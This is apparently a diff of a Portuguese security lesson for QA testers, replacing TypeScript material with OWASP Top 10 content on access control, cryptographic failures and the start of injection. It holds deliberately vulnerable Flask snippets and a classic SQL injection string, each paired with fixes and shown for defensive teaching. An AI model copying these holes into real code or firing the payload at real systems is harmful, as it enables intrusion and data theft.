@@ -1,1636 +1,1456 @@
 ---
 layout: lesson
-title: "Aula 1.2: TypeScript Essencial para Angular"
-slug: typescript-essencial
+title: "Aula 1.2: OWASP Top 10 e Principais Vulnerabilidades"
+slug: owasp-top-10
 module: module-1
 lesson_id: lesson-1-2
 duration: "90 minutos"
-level: "Básico a Intermediário"
-prerequisites: []
-exercises: []
+level: "Básico"
+prerequisites: ["lesson-1-1"]
+exercises: 
+  - lesson-1-2-exercise-1-identificar-vulnerabilidades
+  - lesson-1-2-exercise-2-sql-injection
+  - lesson-1-2-exercise-3-xss-prevencao
+  - lesson-1-2-exercise-4-broken-access-control
+  - lesson-1-2-exercise-5-owasp-checklist
 podcast:
-  file: "assets/podcasts/1.2-TypeScript_em_Angular_do_zero_a_injecao.m4a"
-  image: "assets/images/podcasts/1.2-TypeScript_em_Angular_do_zero_a_injecao.png"
-  title: "TypeScript em Angular: Do Zero à Injeção"
-  description: "Aprenda TypeScript essencial para desenvolvimento Angular eficiente."
+  file: "assets/podcasts/1.2-OWASP_Top_10.m4a"
+  image: "assets/images/podcasts/1.2-OWASP_Top_10.png"
+  title: "OWASP Top 10 - Vulnerabilidades que Todo QA Deve Conhecer"
+  description: "Análise detalhada das 10 principais vulnerabilidades de segurança web segundo OWASP: Injection, Broken Authentication, XSS, e mais. Aprenda a identificá-las em testes."
   duration: "60-75 minutos"
-video:
-  file: "assets/videos/1.2-TypeScript_em_Angular_do_zero_a_injecao.mp4"
-  thumbnail: "assets/images/podcasts/1.2-TypeScript_em_Angular_do_zero_a_injecao.png"
-  title: "TypeScript em Angular: Do Zero à Injeção"
-  description: "Aprenda TypeScript essencial para desenvolvimento Angular eficiente."
-  duration: "60-75 minutos"
-permalink: /modules/fundamentos-acelerados/lessons/typescript-essencial/
+permalink: /modules/fundamentos-seguranca-qa/lessons/owasp-top-10/
 ---
 
-## Introdução
+# Aula 1.2: OWASP Top 10 e Principais Vulnerabilidades
 
-Nesta aula, você dominará os conceitos essenciais de TypeScript necessários para desenvolvimento Angular eficiente. TypeScript é a linguagem base do Angular e entender seus recursos é fundamental para escrever código Angular de qualidade.
+## 🎯 Objetivos de Aprendizado
 
-### Contexto Histórico do TypeScript
+Ao final desta aula, você será capaz de:
 
-TypeScript foi criado pela Microsoft e lançado publicamente em outubro de 2012, como uma resposta aos desafios de desenvolvimento em JavaScript em larga escala. A linguagem foi projetada por Anders Hejlsberg, o mesmo criador do C# e do Turbo Pascal, trazendo conceitos de tipagem estática para o ecossistema JavaScript.
+- Conhecer as 10 principais vulnerabilidades web (OWASP Top 10 2021)
+- Entender como cada vulnerabilidade funciona tecnicamente
+- Aprender a identificá-las em testes de segurança
+- Saber como prevenir e mitigar cada tipo de vulnerabilidade
+- Aplicar conhecimento em contextos específicos de projetos CWI (Financeiro, Educacional, Ecommerce)
 
-**Linha do Tempo de Evolução**:
+## 📚 Introdução ao OWASP Top 10
+
+O **OWASP Top 10** é uma lista das 10 vulnerabilidades de segurança web mais críticas, publicada pela OWASP (Open Web Application Security Project). A versão atual é de 2021, atualizada a cada 3-4 anos com base em dados reais de vulnerabilidades encontradas em aplicações.
+
+### Por que o OWASP Top 10 é Importante?
+
+- **Baseado em dados reais**: Compilado de milhões de vulnerabilidades encontradas em aplicações reais
+- **Linguagem comum**: Permite comunicação efetiva entre Dev, QA e Security
+- **Foco prático**: Prioriza vulnerabilidades mais comuns e impactantes
+- **Atualizado regularmente**: Reflete as ameaças atuais do mundo real
+
+### Evolução do OWASP Top 10
 
 ```
-2012 ──────────────────────────────────────────────────────────── 2024
- │                                                                  │
- ├─ Out 2012    🚀 TypeScript 0.8 - Lançamento inicial
- │
- ├─ Jun 2013    📦 TypeScript 0.9 - Generics e módulos
- │
- ├─ Nov 2014    ⚡ TypeScript 1.0 - Primeira versão estável
- │
- ├─ Nov 2016    🔥 TypeScript 2.0 - Strict null checks, never type
- │
- ├─ Nov 2017    🎯 TypeScript 2.7 - Definite assignment assertions
- │
- ├─ Mar 2018    🚀 TypeScript 2.8 - Conditional types
- │
- ├─ Ago 2018    ⚡ TypeScript 3.0 - Project references
- │
- ├─ Nov 2019    🔥 TypeScript 3.7 - Optional chaining, nullish coalescing
- │
- ├─ Ago 2020    🎯 TypeScript 4.0 - Variadic tuple types
- │
- ├─ Mai 2021    🚀 TypeScript 4.3 - Overload signatures
- │
- ├─ Nov 2022    ⚡ TypeScript 4.9 - satisfies operator
- │
- ├─ Mar 2023    🔥 TypeScript 5.0 - Decorators estáveis, const type parameters
- │
- ├─ Nov 2023    🎯 TypeScript 5.3 - Import attributes
- │
- └─ Mar 2024    🚀 TypeScript 5.4 - NoInfer utility type
+2010 → 2013 → 2017 → 2021
+  │      │      │      │
+  └──────┴──────┴──────┘
+  Evolução das ameaças web
 ```
 
-**Por que TypeScript foi criado?**
-
-No início dos anos 2010, JavaScript estava crescendo rapidamente em complexidade. Projetos grandes enfrentavam problemas comuns:
-- Erros de tipo descobertos apenas em runtime
-- Dificuldade de refatoração em código JavaScript
-- Falta de ferramentas de autocomplete eficientes
-- Manutenção difícil em equipes grandes
-
-TypeScript surgiu como uma solução que mantém a flexibilidade do JavaScript enquanto adiciona segurança de tipos e ferramentas de desenvolvimento superiores.
-
-**Adoção pelo Angular**:
-
-Angular 2 (lançado em 2016) foi um dos primeiros frameworks grandes a adotar TypeScript como linguagem padrão. Esta decisão estratégica trouxe:
-- Type safety em toda a aplicação
-- Melhor experiência de desenvolvimento (autocomplete, refatoração)
-- Código mais manutenível e escalável
-- Integração profunda com ferramentas de desenvolvimento
-
-### O que você vai aprender
-
-- Tipos básicos e avançados do TypeScript
-- Interfaces e tipos customizados
-- Classes e decorators
-- Generics e programação genérica
-- Módulos ES6 e organização de código
-- Integração TypeScript com Angular
-- Utility types e tipos avançados
-- Type guards e narrowing de tipos
-
-### Por que isso é importante
-
-Angular é construído completamente em TypeScript. Sem um entendimento sólido de TypeScript, você não conseguirá aproveitar todo o poder do Angular. TypeScript oferece:
-
-**Para Desenvolvimento**:
-- **Type Safety**: Erros detectados em compile-time, não em runtime
-- **Autocomplete Inteligente**: IDEs podem sugerir propriedades e métodos corretos
-- **Refatoração Segura**: Mudanças em código podem ser feitas com confiança
-- **Documentação Viva**: Tipos servem como documentação inline
-
-**Para Projetos**:
-- **Manutenibilidade**: Código mais fácil de entender e modificar
-- **Escalabilidade**: Suporta projetos grandes e equipes numerosas
-- **Qualidade**: Reduz bugs comuns relacionados a tipos
-- **Produtividade**: Desenvolvimento mais rápido com ferramentas melhores
-
-**Para Carreira**:
-- **Padrão da Indústria**: TypeScript é amplamente adotado em projetos modernos
-- **Requisito Angular**: Essencial para desenvolvimento Angular profissional
-- **Base Sólida**: Conhecimento transferível para outros frameworks (React, Vue)
-- **Diferencial Competitivo**: Habilidade valorizada no mercado
+**Mudanças significativas em 2021**:
+- Inclusão de "Insecure Design" (novo)
+- "Server-Side Request Forgery (SSRF)" entrou no Top 10
+- Foco maior em APIs e arquiteturas modernas
 
 ---
 
-## Conceitos Teóricos
+## 🔟 As 10 Vulnerabilidades Críticas
 
-### Tipos Básicos do TypeScript
+### 1. Broken Access Control
 
-**Definição**: TypeScript adiciona tipagem estática ao JavaScript, permitindo definir tipos para variáveis, parâmetros e retornos de funções. A tipagem estática verifica tipos em tempo de compilação, antes do código ser executado.
+#### 🎭 Analogia: O Porteiro Distraído
 
-**Explicação Detalhada**:
+Imagine um prédio com um porteiro que deveria verificar se você tem permissão para entrar em cada apartamento.
 
-TypeScript oferece um sistema de tipos rico e expressivo que inclui:
+**Cenário Normal**:
+- Você pede: "Quero entrar no apartamento 501"
+- Porteiro verifica: "Você é o dono do 501? Não? Então não pode entrar" ✅
 
-**Tipos Primitivos**:
-- `string`: Representa texto, sequências de caracteres Unicode
-- `number`: Representa números (inteiros, decimais, hexadecimais, binários, octais)
-- `boolean`: Representa valores lógicos (true ou false)
-- `null`: Valor nulo explícito
-- `undefined`: Valor não definido
-- `symbol`: Valores únicos e imutáveis (ES6)
+**Cenário de Ataque (Broken Access Control)**:
+- Você pede: "Quero entrar no apartamento 501"
+- Porteiro não verifica nada e abre a porta ❌
+- Você acessa dados de outra pessoa sem autorização
 
-**Tipos Especiais**:
-- `any`: Desabilita verificação de tipos - use apenas quando necessário
-- `void`: Ausência de valor de retorno (usado principalmente em funções)
-- `never`: Tipo que representa valores que nunca ocorrem (funções que nunca retornam ou sempre lançam exceções)
-- `unknown`: Tipo seguro para valores desconhecidos (alternativa melhor que `any`)
+Na web, isso acontece quando a aplicação não valida adequadamente se o usuário tem permissão para acessar um recurso específico.
 
-**Inferência de Tipos**:
+#### Definição Técnica
 
-TypeScript pode inferir tipos automaticamente quando você não especifica explicitamente:
+**Broken Access Control** ocorre quando restrições de acesso não são aplicadas corretamente, permitindo que usuários acessem recursos ou executem ações além de suas permissões.
 
-```typescript
-let x = 10;           // TypeScript infere: number
-let name = "Angular"; // TypeScript infere: string
-let active = true;    // TypeScript infere: boolean
-```
-
-**Analogia Detalhada**:
-
-Imagine que você está organizando uma biblioteca. Em JavaScript puro, é como ter uma biblioteca sem sistema de catalogação - você pode colocar qualquer livro em qualquer lugar, mas quando precisar encontrar algo específico, terá que procurar manualmente e pode cometer erros.
-
-TypeScript é como ter um sistema de catalogação completo:
-- Cada livro (variável) tem um número de catalogação específico (tipo)
-- O bibliotecário (compilador) verifica se você está colocando o livro no lugar certo antes de aceitar
-- Se você tentar colocar um romance onde deveria ser um livro técnico, o sistema avisa imediatamente
-- Quando você precisa de um livro, o sistema sabe exatamente onde procurar e pode sugerir opções corretas
-
-**Visualização Detalhada**:
+#### Fluxo de Ataque
 
 ```
-┌─────────────────────────────────────────────────────────────┐
-│                    JavaScript (Sem Tipos)                   │
-├─────────────────────────────────────────────────────────────┤
-│                                                              │
-│  Variável: x                                                 │
-│  ┌─────────────┐                                            │
-│  │   Valor: 10 │  ← Pode ser qualquer coisa                 │
-│  └─────────────┘                                            │
-│                                                              │
-│  Problemas:                                                  │
-│  • Erros só aparecem em runtime                             │
-│  • Sem autocomplete inteligente                             │
-│  • Refatoração perigosa                                     │
-│  • Sem documentação de tipos                                │
-│                                                              │
-└─────────────────────────────────────────────────────────────┘
-
-┌─────────────────────────────────────────────────────────────┐
-│                    TypeScript (Com Tipos)                   │
-├─────────────────────────────────────────────────────────────┤
-│                                                              │
-│  Variável: x                                                 │
-│  ┌─────────────────────────┐                                │
-│  │ Tipo: number           │  ← Verificado em compile-time   │
-│  │ Valor: 10              │                                 │
-│  └─────────────────────────┘                                │
-│                                                              │
-│  Benefícios:                                                 │
-│  • Erros detectados antes de executar                       │
-│  • Autocomplete baseado em tipos                            │
-│  • Refatoração segura                                       │
-│  • Tipos servem como documentação                           │
-│                                                              │
-└─────────────────────────────────────────────────────────────┘
-
-Fluxo de Verificação de Tipos:
-
-Código TypeScript          Compilador TS          JavaScript
-     │                          │                      │
-     ├─ let x: number = 10       │                      │
-     │                          ├─ Verifica tipo      │
-     │                          │  ✓ Correto          │
-     │                          │                      ├─ let x = 10;
-     │                          │                      │
-     ├─ x = "texto"             │                      │
-     │                          ├─ Verifica tipo      │
-     │                          │  ✗ Erro!            │
-     │                          │  Não compila        │
-     │                          │                      │
+┌─────────────────────────────────────────────────────────┐
+│  FLUXO DE BROKEN ACCESS CONTROL                         │
+│                                                         │
+│  Atacante                    Aplicação                 │
+│    │                            │                      │
+│    │──GET /api/users/123───────>│                      │
+│    │                            │                      │
+│    │                            │ ❌ Não verifica      │
+│    │                            │    se usuário        │
+│    │                            │    logado é o        │
+│    │                            │    dono do ID 123    │
+│    │                            │                      │
+│    │<──DADOS DO USUÁRIO 123────│                      │
+│    │                            │                      │
+│    │                            │                      │
+│    │──GET /api/admin/users─────>│                      │
+│    │                            │                      │
+│    │                            │ ❌ Não verifica      │
+│    │                            │    se usuário        │
+│    │                            │    é admin           │
+│    │                            │                      │
+│    │<──LISTA DE TODOS USERS────│                      │
+│    │                            │                      │
+└─────────────────────────────────────────────────────────┘
 ```
 
-**Exemplo Prático Completo**:
+#### Exemplos Práticos
 
-```typescript
-let userName: string = "João";
-let userAge: number = 30;
-let isActive: boolean = true;
-let salary: number = 5000.50;
-let hexValue: number = 0xf00d;
-let binaryValue: number = 0b1010;
+**Exemplo 1: Acesso Direto a Objetos (IDOR - Insecure Direct Object Reference)**
 
-let userData: any = { name: "João", age: 30 };
+```python
+# ❌ VULNERÁVEL - Não valida propriedade
+@app.route('/api/users/<user_id>')
+def get_user(user_id):
+    user = db.get_user(user_id)  # Não verifica se usuário logado é o dono
+    return jsonify(user)
 
-function greet(name: string): string {
-  return `Olá, ${name}!`;
-}
-
-function logError(message: string): void {
-  console.error(message);
-}
-
-function throwError(message: string): never {
-  throw new Error(message);
-}
-
-function processValue(value: unknown): void {
-  if (typeof value === "string") {
-    console.log(value.toUpperCase());
-  } else if (typeof value === "number") {
-    console.log(value.toFixed(2));
-  }
-}
+# Ataque possível:
+# GET /api/users/456 (usuário logado é 123)
+# Resultado: Acessa dados de outro usuário!
 ```
 
-**Type Narrowing**:
-
-TypeScript usa type narrowing para restringir tipos baseado em verificações:
-
-```typescript
-function processValue(value: string | number) {
-  if (typeof value === "string") {
-    value.toUpperCase();
-  } else {
-    value.toFixed(2);
-  }
-}
+```python
+# ✅ SEGURO - Valida propriedade
+@app.route('/api/users/<user_id>')
+def get_user(user_id):
+    current_user_id = session['user_id']
+    if int(user_id) != current_user_id:
+        return jsonify({'error': 'Unauthorized'}), 403
+    user = db.get_user(user_id)
+    return jsonify(user)
 ```
+
+**Exemplo 2: Elevação de Privilégios**
+
+```python
+# ❌ VULNERÁVEL - Confia em parâmetro do cliente
+@app.route('/api/admin/users')
+def admin_users():
+    is_admin = request.json.get('is_admin', False)  # Cliente pode enviar True!
+    if is_admin:
+        return jsonify(db.get_all_users())
+    return jsonify({'error': 'Forbidden'}), 403
+
+# Ataque:
+# POST /api/admin/users {"is_admin": true}
+# Resultado: Usuário comum vira admin!
+```
+
+```python
+# ✅ SEGURO - Valida no servidor
+@app.route('/api/admin/users')
+def admin_users():
+    current_user = db.get_user(session['user_id'])
+    if not current_user.is_admin:  # Valida no servidor
+        return jsonify({'error': 'Forbidden'}), 403
+    return jsonify(db.get_all_users())
+```
+
+#### Contexto CWI - Casos Reais
+
+**Caso Financeiro (Fintech)**:
+Em um projeto de fintech da CWI, identificamos que endpoints de consulta de extrato não validavam se o usuário logado era o dono da conta consultada. Um usuário poderia modificar o ID da conta na URL e acessar extratos de outras pessoas. A correção implementou validação de propriedade em todos os endpoints sensíveis.
+
+**Caso Educacional (EdTech)**:
+Em uma plataforma educacional, alunos conseguiam acessar notas de outros alunos modificando o ID do aluno na URL. A vulnerabilidade foi corrigida adicionando validação de permissão baseada em relacionamento aluno-turma.
+
+#### Como Testar
+
+**Checklist de Testes**:
+- [ ] Tentar acessar recursos de outros usuários modificando IDs na URL
+- [ ] Testar endpoints administrativos sem ser admin
+- [ ] Verificar se tokens de sessão são validados corretamente
+- [ ] Testar navegação forçada para páginas protegidas
+- [ ] Validar controles de autorização em todas as operações CRUD
+
+**Exemplo de Teste Manual**:
+```bash
+# 1. Login como usuário comum
+POST /api/login {"email": "user@example.com", "password": "pass123"}
+# Recebe token: abc123
+
+# 2. Tentar acessar recurso de outro usuário
+GET /api/users/999
+Authorization: Bearer abc123
+# ❌ Deve retornar 403 Forbidden
+
+# 3. Tentar acessar endpoint admin
+GET /api/admin/users
+Authorization: Bearer abc123
+# ❌ Deve retornar 403 Forbidden
+```
+
+#### Prevenção
+
+**Boas Práticas**:
+1. **Sempre validar no servidor**: Nunca confie em validações apenas no cliente
+2. **Princípio do menor privilégio**: Usuários só devem ter acesso ao mínimo necessário
+3. **Validação de propriedade**: Verificar se usuário é dono do recurso antes de permitir acesso
+4. **Controle de acesso baseado em roles**: Implementar RBAC (Role-Based Access Control)
+5. **Testes de autorização**: Criar testes automatizados para validar controles de acesso
 
 ---
 
-### Interfaces e Tipos Customizados
+### 2. Cryptographic Failures
 
-**Definição**: Interfaces definem contratos que objetos devem seguir, especificando quais propriedades e métodos um objeto deve ter. Interfaces são estruturas puramente de tipo - não geram código JavaScript em runtime, apenas verificações em compile-time.
+#### 🎭 Analogia: A Carta Aberta
 
-**Explicação Detalhada**:
+Imagine enviar uma carta confidencial pelo correio.
 
-Interfaces são fundamentais em Angular para:
-- **Definir estruturas de dados**: Modelos de dados consistentes em toda aplicação
-- **Tipar componentes e serviços**: Garantir que componentes recebam dados corretos
-- **Garantir consistência**: Múltiplos objetos seguem o mesmo contrato
-- **Melhorar autocomplete**: IDEs podem sugerir propriedades disponíveis
-- **Facilitar refatoração**: Mudanças em interfaces propagam erros para todos os usos
+**Cenário Seguro**:
+- Você coloca a carta em um envelope lacrado ✅
+- Apenas o destinatário pode abrir ✅
 
-**Características de Interfaces**:
+**Cenário Vulnerável (Cryptographic Failures)**:
+- Você envia a carta sem envelope ❌
+- Qualquer um que pegue pode ler o conteúdo ❌
 
-1. **Propriedades Opcionais**: Usando `?` para propriedades que podem não existir
-2. **Propriedades Readonly**: Usando `readonly` para propriedades imutáveis
-3. **Herança**: Interfaces podem estender outras interfaces
-4. **Index Signatures**: Permitem propriedades dinâmicas
-5. **Métodos**: Podem definir assinaturas de métodos
+Na web, isso acontece quando dados sensíveis não são protegidos adequadamente com criptografia.
 
-**Analogia Detalhada**:
+#### Definição Técnica
 
-Uma interface é como um contrato de trabalho. O contrato especifica:
-- **O que você deve fazer** (propriedades obrigatórias): "Você deve ter nome, email e ID"
-- **O que é opcional** (propriedades opcionais): "Idade é opcional, mas recomendada"
-- **O que você não pode mudar** (readonly): "ID não pode ser alterado após criação"
-- **Especializações** (extends): "Admin tem tudo que User tem, mais permissões"
+**Cryptographic Failures** (anteriormente "Sensitive Data Exposure") ocorre quando dados sensíveis não são protegidos adequadamente com criptografia, seja em trânsito (HTTPS) ou em repouso (banco de dados).
 
-Assim como um contrato de trabalho garante que empregado e empregador saibam exatamente o que esperar, uma interface garante que o código saiba exatamente que estrutura de dados esperar.
+#### Tipos de Falhas Criptográficas
 
-**Visualização Detalhada**:
+| Tipo | Descrição | Impacto |
+|------|-----------|---------|
+| **Dados em texto plano** | Senhas, tokens armazenados sem hash | Crítico - Acesso total ao sistema |
+| **HTTPS ausente** | Dados transmitidos via HTTP | Crítico - Interceptação de dados |
+| **Algoritmos fracos** | MD5, SHA1, DES, RC4 | Alto - Vulnerável a ataques |
+| **Chaves expostas** | Chaves de criptografia no código | Crítico - Decriptografia possível |
+| **Certificados inválidos** | Certificados SSL auto-assinados ou expirados | Médio - Man-in-the-middle |
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                    Interface (Contrato)                     │
-├─────────────────────────────────────────────────────────────┤
-│                                                              │
-│  interface User {                                            │
-│    id: number;          ← Obrigatório                       │
-│    name: string;       ← Obrigatório                       │
-│    email: string;      ← Obrigatório                       │
-│    age?: number;       ← Opcional (?)                       │
-│    readonly createdAt: Date; ← Imutável                    │
-│  }                                                           │
-│                                                              │
-│  ┌──────────────────────────────────────────────────────┐  │
-│  │  Validação em Compile-Time                           │  │
-│  │                                                       │  │
-│  │  ✓ { id: 1, name: "João", email: "..." }            │  │
-│  │  ✗ { name: "João" }  ← Falta 'id' e 'email'         │  │
-│  │  ✗ { id: "1", ... }  ← 'id' deve ser number         │  │
-│  └──────────────────────────────────────────────────────┘  │
-│                                                              │
-└─────────────────────────────────────────────────────────────┘
+#### Exemplos Práticos
 
-Herança de Interfaces:
+**Exemplo 1: Senhas em Texto Plano**
 
-┌─────────────────────┐
-│   interface User    │
-│   id: number        │
-│   name: string      │
-│   email: string     │
-└──────────┬──────────┘
-           │ extends
-           │
-           ├──────────────────┐
-           │                  │
-┌──────────▼──────────┐  ┌────▼──────────────┐
-│ interface Admin     │  │ interface Customer│
-│ extends User        │  │ extends User      │
-│                     │  │                   │
-│ permissions:        │  │ billingAddress:   │
-│   string[]         │  │   string          │
-└────────────────────┘  └───────────────────┘
+```python
+# ❌ VULNERÁVEL - Senha em texto plano
+def create_user(username, password):
+    db.users.insert({
+        'username': username,
+        'password': password  # Armazenado em texto plano!
+    })
+
+# Se banco for comprometido, todas as senhas são expostas
 ```
 
-**Exemplo Prático Completo**:
+```python
+# ✅ SEGURO - Hash com bcrypt
+import bcrypt
 
-```typescript
-interface User {
-  id: number;
-  name: string;
-  email: string;
-  age?: number;
-  readonly createdAt: Date;
-}
+def create_user(username, password):
+    hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
+    db.users.insert({
+        'username': username,
+        'password': hashed  # Hash irreversível
+    })
 
-interface Admin extends User {
-  permissions: string[];
-  role: "admin" | "super-admin";
-}
-
-interface UserPreferences {
-  theme: "light" | "dark";
-  language: string;
-  [key: string]: any;
-}
-
-interface Repository<T> {
-  findById(id: number): T | null;
-  save(entity: T): T;
-  delete(id: number): boolean;
-}
-
-const user: User = {
-  id: 1,
-  name: "João",
-  email: "joao@example.com",
-  age: 30,
-  createdAt: new Date()
-};
-
-const admin: Admin = {
-  id: 2,
-  name: "Maria",
-  email: "maria@example.com",
-  permissions: ["read", "write", "delete"],
-  role: "admin",
-  createdAt: new Date()
-};
-
-function processUser(user: User): void {
-  console.log(`Processando usuário: ${user.name}`);
-}
-
-function updateUser(user: User, updates: Partial<User>): User {
-  return { ...user, ...updates };
-}
+def verify_password(password, hashed):
+    return bcrypt.checkpw(password.encode('utf-8'), hashed)
 ```
 
-**Type Aliases vs Interfaces**:
+**Exemplo 2: Dados Transmitidos sem HTTPS**
 
-TypeScript oferece duas formas de definir tipos customizados:
-
-```typescript
-interface UserInterface {
-  name: string;
-  age: number;
-}
-
-type UserType = {
-  name: string;
-  age: number;
-};
-
-type Status = "pending" | "approved" | "rejected";
-type UserId = number;
-type UserMap = Map<UserId, UserInterface>;
+```python
+# ❌ VULNERÁVEL - API sem HTTPS
+@app.route('/api/login', methods=['POST'])
+def login():
+    # Dados enviados via HTTP podem ser interceptados
+    username = request.json['username']
+    password = request.json['password']
+    # ...
 ```
 
-**Diferenças**:
-- **Interfaces**: Podem ser estendidas e mescladas (declaration merging)
-- **Type Aliases**: Podem representar tipos mais complexos (unions, intersections, primitivos)
+```python
+# ✅ SEGURO - Forçar HTTPS
+from flask_sslify import SSLify
+
+app = Flask(__name__)
+sslify = SSLify(app)  # Redireciona HTTP para HTTPS
+
+@app.route('/api/login', methods=['POST'])
+def login():
+    # Dados protegidos via HTTPS
+    username = request.json['username']
+    password = request.json['password']
+    # ...
+```
+
+#### Contexto CWI - Casos Reais
+
+**Caso Financeiro (PCI-DSS)**:
+Em um projeto financeiro, identificamos que números de cartão eram armazenados sem criptografia adequada. Para compliance PCI-DSS, implementamos tokenização (substituição por tokens) e criptografia AES-256 para dados sensíveis.
+
+**Caso Educacional (LGPD)**:
+Em uma plataforma educacional, dados de menores eram transmitidos via HTTP em algumas rotas. Implementamos HTTPS obrigatório e criptografia adicional para dados sensíveis de menores.
+
+#### Como Testar
+
+**Checklist de Testes**:
+- [ ] Verificar se senhas são armazenadas com hash (nunca texto plano)
+- [ ] Confirmar que toda comunicação usa HTTPS
+- [ ] Validar que algoritmos de hash são seguros (bcrypt, Argon2, scrypt)
+- [ ] Verificar se chaves de criptografia não estão no código
+- [ ] Testar se certificados SSL são válidos e não expirados
+
+**Exemplo de Teste**:
+```bash
+# 1. Verificar se senha está em texto plano no banco
+# ❌ Se encontrar senha legível, é vulnerável
+
+# 2. Testar se API aceita HTTP
+curl http://api.example.com/login
+# ❌ Deve redirecionar para HTTPS ou negar
+
+# 3. Verificar certificado SSL
+openssl s_client -connect api.example.com:443
+# ✅ Deve mostrar certificado válido
+```
+
+#### Prevenção
+
+**Boas Práticas**:
+1. **Hash de senhas**: Sempre usar bcrypt, Argon2 ou scrypt (nunca MD5/SHA1)
+2. **HTTPS obrigatório**: Forçar HTTPS em todas as conexões
+3. **Criptografia em repouso**: Criptografar dados sensíveis no banco
+4. **Gerenciamento de chaves**: Usar serviços como AWS KMS, HashiCorp Vault
+5. **Algoritmos atualizados**: Usar AES-256, RSA 2048+, ECDSA
 
 ---
 
-### Classes e Decorators
+### 3. Injection
 
-**Definição**: Classes são estruturas que encapsulam dados (propriedades) e comportamentos (métodos) em uma única unidade. Decorators são funções especiais que modificam classes, métodos ou propriedades em tempo de compilação, adicionando metadados e comportamento adicional.
+#### 🎭 Analogia: A Biblioteca Enganada
 
-**Explicação Detalhada**:
+Imagine uma biblioteca com um atendente que busca livros baseado no que você escreve num papel.
 
-Em Angular, classes são a base de todos os principais conceitos:
-- **Componentes**: Classes decoradas com `@Component`
-- **Serviços**: Classes decoradas com `@Injectable`
-- **Diretivas**: Classes decoradas com `@Directive`
-- **Pipes**: Classes decoradas com `@Pipe`
-- **Guards**: Classes que implementam interfaces específicas
-- **Interceptors**: Classes que implementam `HttpInterceptor`
+**Cenário Normal**:
+- Você escreve: "Livro de Python"
+- Atendente busca: "Livro de Python"
+- Resultado: Recebe o livro correto ✅
 
-**Modificadores de Acesso**:
+**Cenário de Ataque (SQL Injection)**:
+- Você escreve: "Livro de Python' OR '1'='1"
+- Atendente busca: "Livro de Python' OR '1'='1"
+- Resultado: Recebe TODOS os livros da biblioteca! ❌
 
-TypeScript oferece três modificadores de acesso:
-- `public`: Acessível de qualquer lugar (padrão)
-- `private`: Acessível apenas dentro da classe
-- `protected`: Acessível na classe e subclasses
+O atendente (banco de dados) foi enganado porque não validou a entrada.
 
-**Decorators em Angular**:
+#### Definição Técnica
 
-Decorators são essenciais em Angular e funcionam como anotações que fornecem metadados:
-- `@Component`: Define um componente Angular com template e estilos
-- `@Injectable`: Marca uma classe como injetável no sistema de DI
-- `@Input()`: Marca propriedade para receber dados do componente pai
-- `@Output()`: Marca evento para emitir dados para componente pai
-- `@HostListener`: Escuta eventos do host
-- `@HostBinding`: Liga propriedade a atributo do host
+**Injection** ocorre quando dados não confiáveis são enviados a um interpretador como parte de um comando ou query, permitindo que o atacante execute comandos não autorizados.
 
-**Analogia Detalhada**:
+#### Tipos de Injection
 
-Uma classe é como uma fábrica de carros. A classe define:
-- **Propriedades** (ingredientes): O que o carro tem (motor, rodas, cor)
-- **Métodos** (processos): O que o carro pode fazer (acelerar, frear, virar)
-- **Construtor** (linha de montagem): Como criar um carro específico
-- **Modificadores de acesso** (segurança): Quem pode acessar o que (motorista pode acelerar, mas não pode modificar o motor diretamente)
+| Tipo | Onde Ocorre | Impacto |
+|------|-------------|---------|
+| **SQL Injection** | Consultas SQL | Crítico - Acesso ao banco de dados |
+| **NoSQL Injection** | Consultas MongoDB, CouchDB | Crítico - Acesso ao banco de dados |
+| **Command Injection** | Comandos do sistema operacional | Crítico - Execução de comandos |
+| **LDAP Injection** | Consultas LDAP | Alto - Acesso a diretórios |
+| **XPath Injection** | Consultas XPath | Médio - Acesso a dados XML |
 
-Decorators são como adesivos especiais que você cola no carro:
-- `@Component` é como um adesivo "Carro de Passeio" - muda como o carro funciona
-- `@Injectable` é como um adesivo "Serviço de Transporte" - permite que outros usem o carro
-- `@Input()` é como uma entrada de combustível - permite receber energia externa
-- `@Output()` é como um escape - permite emitir gases (eventos)
-
-**Visualização Detalhada**:
+#### Fluxo de SQL Injection
 
 ```
-┌─────────────────────────────────────────────────────────────┐
-│                    Classe (Template)                        │
-├─────────────────────────────────────────────────────────────┤
-│                                                              │
-│  class User {                                                │
-│    ┌────────────────────────────────────────────────────┐  │
-│    │  Modificadores de Acesso                           │  │
-│    │                                                     │  │
-│    │  private id: number;      ← Apenas dentro da classe│  │
-│    │  public name: string;    ← Qualquer lugar         │  │
-│    │  protected email: string;← Classe e subclasses    │  │
-│    └────────────────────────────────────────────────────┘  │
-│                                                              │
-│    constructor(...) { ... }   ← Inicialização             │
-│    greet(): string { ... }    ← Comportamento             │
-│  }                                                           │
-│                                                              │
-│  ┌──────────────────────────────────────────────────────┐  │
-│  │  Instanciação                                         │  │
-│  │                                                       │  │
-│  │  const user = new User(1, "João", "joao@...");      │  │
-│  │         │                                             │  │
-│  │         └─→ Cria objeto com propriedades definidas   │  │
-│  └──────────────────────────────────────────────────────┘  │
-│                                                              │
-└─────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────┐
+│  FLUXO DE SQL INJECTION                                 │
+│                                                         │
+│  Cliente                    Aplicação        Banco      │
+│    │                            │              │        │
+│    │──"user' OR '1'='1"────────>│              │        │
+│    │                            │              │        │
+│    │                            │──SELECT * ──>│        │
+│    │                            │   FROM users │        │
+│    │                            │   WHERE name│        │
+│    │                            │   = 'user'   │        │
+│    │                            │   OR '1'='1' │        │
+│    │                            │              │        │
+│    │                            │<─TODOS USERS─┤        │
+│    │                            │              │        │
+│    │<───DADOS VAZADOS──────────│              │        │
+│    │                                                    │
+└─────────────────────────────────────────────────────────┘
 
-Herança e Polimorfismo:
-
-┌──────────────────────┐
-│    class User        │
-│  ┌────────────────┐  │
-│  │ id: number     │  │
-│  │ name: string   │  │
-│  │ email: string  │  │
-│  └────────────────┘  │
-│  greet(): string     │
-└──────────┬───────────┘
-           │ extends
-           │
-    ┌──────┴──────┐
-    │            │
-┌───▼────┐  ┌───▼────────┐
-│ Admin  │  │ Customer   │
-│        │  │            │
-│ perms: │  │ address:   │
-│ string[]│  │ string     │
-│        │  │            │
-│ greet()│  │ greet()    │
-│ override│  │ override   │
-└────────┘  └────────────┘
-
-Decorators em Ação:
-
-┌─────────────────────────────────────────────────────────────┐
-│  @Component({                                               │
-│    selector: 'app-user',                                    │
-│    template: '<div>{{name}}</div>'                          │
-│  })                                                         │
-│  class UserComponent {                                      │
-│    @Input() name: string;     ← Recebe do pai              │
